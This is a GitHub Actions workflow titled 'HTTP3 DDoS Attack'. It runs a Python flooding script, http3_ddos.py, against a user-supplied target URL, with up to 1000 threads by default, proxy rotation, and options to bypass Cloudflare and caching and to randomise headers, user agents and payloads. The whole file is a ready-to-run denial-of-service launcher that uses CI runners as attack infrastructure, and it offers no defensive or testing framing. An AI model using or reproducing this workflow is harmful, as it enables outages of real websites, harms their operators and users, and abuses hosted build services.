name: HTTP3 DDoS Attack

on:
  workflow_dispatch:
    inputs:
      target_url:
        description: 'Target URL'
        required: true
        default: 'https://example.com'
      method:
        description: 'HTTP Method'
        required: true
        default: 'GET'
        type: choice
        options:
        - GET
        - POST
        - HEAD
      threads:
        description: 'Number of threads'
        required: true
        default: '1000'
      duration:
        description: 'Attack duration in seconds'
        required: true
        default: '300'
      proxy_file:
        description: 'Proxy file path'
        required: true
        default: 'proxy.txt'
      timeout:
        description: 'Request timeout in seconds'
        required: true
        default: '5'
      cloudflare_bypass:
        description: 'Enable Cloudflare bypass'
        type: boolean
        default: true
      cache_bypass:
        description: 'Enable cache bypass'
        type: boolean
        default: true
      random_headers:
        description: 'Enable random headers'
        type: boolean
        default: true
      random_user_agents:
        description: 'Enable random user agents'
        type: boolean
        default: true
      random_payload:
        description: 'Enable random payloads'
        type: boolean
        default: true
      http3:
        description: 'Enable HTTP/3'
        type: boolean
        default: true
      verify_ssl:
        description: 'Verify SSL certificates'
        type: boolean
        default: false
      follow_redirects:
        description: 'Follow redirects'
        type: boolean
        default: false

jobs:
  ddos-attack:
    runs-on: ubuntu-latest
    steps:
    - name: Checkout code
      uses: actions/checkout@v4    
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.10'
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install requests beautifulsoup4
   
    
    - name: Run HTTP3 DDoS Attack
      run: |
        python http3_ddos.py \
          -u "${{ github.event.inputs.target_url }}" \
          -p "${{ github.event.inputs.proxy_file }}" \
          -t "${{ github.event.inputs.threads }}" \
          -d "${{ github.event.inputs.duration }}" \
          -m "${{ github.event.inputs.method }}" \
          --timeout "${{ github.event.inputs.timeout }}" \
          ${{ github.event.inputs.cloudflare_bypass != 'true' && '--no-cloudflare' || '' }} \
          ${{ github.event.inputs.cache_bypass != 'true' && '--no-cache' || '' }} \
          ${{ github.event.inputs.random_headers != 'true' && '--no-random-headers' || '' }} \
          ${{ github.event.inputs.random_user_agents != 'true' && '--no-random-ua' || '' }} \
          ${{ github.event.inputs.random_payload != 'true' && '--no-random-payload' || '' }} \
          ${{ github.event.inputs.http3 != 'true' && '--no-http3' || '' }} \
          ${{ github.event.inputs.verify_ssl == 'true' && '--verify-ssl' || '' }} \
          ${{ github.event.inputs.follow_redirects == 'true' && '--follow-redirects' || '' }}
    
    - name: Upload logs
      uses: actions/upload-artifact@v4
      if: always()
      with:
        name: ddos-logs
        path: ddos_attack.log
